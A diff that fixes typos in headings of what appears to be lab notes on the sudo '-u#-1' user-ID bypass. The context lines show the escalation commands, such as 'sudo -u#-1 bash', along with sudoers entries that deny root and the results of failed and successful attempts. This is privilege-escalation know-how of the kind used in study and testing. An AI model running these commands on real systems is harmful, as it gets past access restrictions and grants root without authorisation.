@@ -43,7 +43,7 @@ sudo -u#-1 bash
 or,
 sudo -u#4294967295 bash 
 ```
-## Didn't work, When i used /usr/bin/bash to execute eccept root
+## Didn't work, When I used /usr/bin/bash to execute Accept root
 
 ```
 lucy    ALL=(ALL, !root)        /usr/bin/id
@@ -132,7 +132,7 @@ OS: Ubuntu 16.04.6 LTS \n \l
 Kernel: Linux blak-off 4.15.0-65-generic
 ```
 
-## This also didn't work, when i used " /usr/bin/bash"
+## This also didn't work, when I used " /usr/bin/bash"
 ```
 john    ALL=(ALL, !root)        /usr/bin/bash
 ```
@@ -163,7 +163,7 @@ Sorry, user john is not allowed to execute '/bin/bash' as #-1 on blak-off.
 john@blak-off:/home/blak$ sudo -u#-1 bash -u
 Sorry, user john is not allowed to execute '/bin/bash -u' as #-1 on blak-off.
 ```
-## But it works when i used "/usr/bin/id"
+## But it works when I used "/usr/bin/id"
 ```
 john    ALL=(ALL, !root) /usr/bin/id
 ```
